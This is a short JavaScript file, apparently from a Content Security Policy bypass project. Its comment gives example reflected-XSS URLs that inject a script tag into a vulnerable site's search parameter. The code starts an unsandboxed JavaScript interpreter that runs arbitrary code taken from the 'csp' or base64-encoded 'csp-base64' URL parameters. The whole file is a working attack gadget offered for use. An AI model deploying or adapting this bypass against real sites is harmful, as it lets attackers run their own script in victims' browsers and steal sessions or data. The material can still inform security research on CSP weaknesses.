/*
	Reflected XSS scenario where you are size limited.

	This will look for the GET parameter "CSP" and evaluate it.

	Example:
	- http://vulnerable.com/?csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
	- http://vulnerable.com/?csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
*/
import Sval from 'sval'

const options = {
  ecmaVer: 9,
  sandBox: false,
}

const interpreter = new Sval(options)

window.addEventListener("load", () => {
	const urlParams = new URLSearchParams(window.location.search);
	let csp = urlParams.get('csp');
	if (csp) interpreter.run(csp)

	csp = urlParams.get('csp-base64');
	if (csp) interpreter.run(atob(csp))
});
